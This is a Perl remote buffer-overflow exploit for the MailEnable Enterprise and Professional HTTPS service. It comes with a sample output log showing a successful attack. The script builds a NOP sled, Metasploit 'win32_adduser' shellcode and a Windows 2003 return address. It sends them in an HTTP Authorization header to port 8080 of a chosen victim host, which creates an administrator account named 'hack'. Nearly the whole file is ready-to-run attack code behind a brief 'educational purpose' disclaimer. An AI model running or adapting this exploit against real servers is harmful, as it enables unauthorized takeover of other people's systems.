#!/usr/bin/perl
# This tools and to consider only himself to educational purpose
#
# 
#-=[MailEnable (Enterprise & Professional) HTTPS remote BoF exploit]=-
#-=[                                                               ]=-
#-=[ Discovered & Coded by CorryL            info:www.x0n3-h4ck.org]=-
#-=[ irc.xoned.net #x0n3-h4ck                 corryl80[at]gmail.com]=-
#
#[+]Connecting to 127.0.0.1
#[+]Sending Evil Request
#[+]Creating Administrator User
#Connect to 127.0.0.1 Using User (hack) Pass (hack)
#
#D:\Documents and Settings\Administrator\Desktop\prova bof\mailenable-bug+exploit
#>net users
#
#Account utente per \\SERVER
#
#-------------------------------------------------------------------------------
#__vmware_user__          Administrator            ASPNET
#Guest                    hack                     IME_ADMIN
#IME_USER                 IUSR_SERVER              IWAM_SERVER
#SUPPORT_388945a0
#Esecuzione comando riuscita.
#
#
#Greatz All Users & Friends on irc.xoned.net #x0n3-h4ck


use IO::Socket; 
$ret = "\x6c\x36\xb7"; #RET For Win2003
$nop = "\x90"x24;
#win32_adduser -  PASS=hack EXITFUNC=thread USER=hack Size=240 Encoder=PexFnstenvSub http://metasploit.com
my $shellcode =
"\x33\xc9\x83\xe9\xca\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc7".
"\x7e\x10\xf5\x83\xeb\xfc\xe2\xf4\x3b\x96\x56\xf5\xc7\x7e\x9b\xb0".
"\xfb\xf5\x6c\xf0\xbf\x7f\xff\x7e\x88\x66\x9b\xaa\xe7\x7f\xfb\x16".
"\xe9\x37\x9b\xc1\x4c\x7f\xfe\xc4\x07\xe7\xbc\x71\x07\x0a\x17\x34".
"\x0d\x73\x11\x37\x2c\x8a\x2b\xa1\xe3\x7a\x65\x16\x4c\x21\x34\xf4".
"\x2c\x18\x9b\xf9\x8c\xf5\x4f\xe9\xc6\x95\x9b\xe9\x4c\x7f\xfb\x7c".
"\x9b\x5a\x14\x36\xf6\xbe\x74\x7e\x87\x4e\x95\x35\xbf\x71\x9b\xb5".
"\xcb\xf5\x60\xe9\x6a\xf5\x78\xfd\x2e\x75\x10\xf5\xc7\xf5\x50\xc1".
"\xc2\x02\x10\xf5\xc7\xf5\x78\xc9\x98\x4f\xe6\x95\x91\x95\x1d\x9d".
"\x28\xb0\xf0\x95\xaf\xe6\xee\x7f\xc9\x29\xef\x12\x2f\x90\xef\x0a".
"\x38\x1d\x7d\x91\xe9\x1b\x68\x90\xe7\x51\x73\xd5\xa9\x1b\x64\xd5".
"\xb2\x0d\x75\x87\xe7\x16\x71\x96\xac\x5e\x78\x94\xa4\x15\x30\xda".
"\x86\x3a\x54\xd5\xe1\x58\x30\x9b\xa2\x0a\x30\x99\xa8\x1d\x71\x99".
"\xa0\x0c\x7f\x80\xb7\x5e\x51\x91\xaa\x17\x7e\x9c\xb4\x0a\x62\x94".
"\xb3\x11\x62\x86\xe7\x16\x71\x96\xac\x5e\x3f\xb4\x83\x3a\x10\xf5";

use Getopt::Std; getopts('h:', \%args);


if (defined($args{'h'})) { $host = $args{'h'}; }

print STDERR "\n-=[MailEnable (Enterprise & Professional) HTTPS remote BoF exploit]=-\n";
print STDERR "-=[                                                               ]=-\n";
print STDERR "-=[ Discovered & Coded by CorryL            info:www.x0n3-h4ck.org]=-\n";
print STDERR "-=[ irc.xoned.net #x0n3-h4ck                 corryl80[at]gmail.com]=-\n\n";

if (!defined($host)) {
Usage();
}

$bof = $nop.$shellcode.$ret;
$ric = "GET / HTTP/1.0\r\n";
$ric2 = "Authorization: $bof\r\n\r\n";
$richiesta = $ric.$ric2;
print "[+]Connecting to $host\n";
sleep 2;
$socket = new IO::Socket::INET (PeerAddr => "$host",
                                PeerPort => 8080,
                                Proto => 'tcp');
                                die unless $socket;
                                print "[+]Sending Evil Request\n";
                                sleep 2;
                                print $socket "$richiesta";
                                print "[+]Creating Administrator User\n";
                                print "Connect to $host Using User (hack) Pass (hack)\n";
                                
                               
close;

sub Usage {
print STDERR "Usage:
-h Victim host.\n\n";
exit;
}


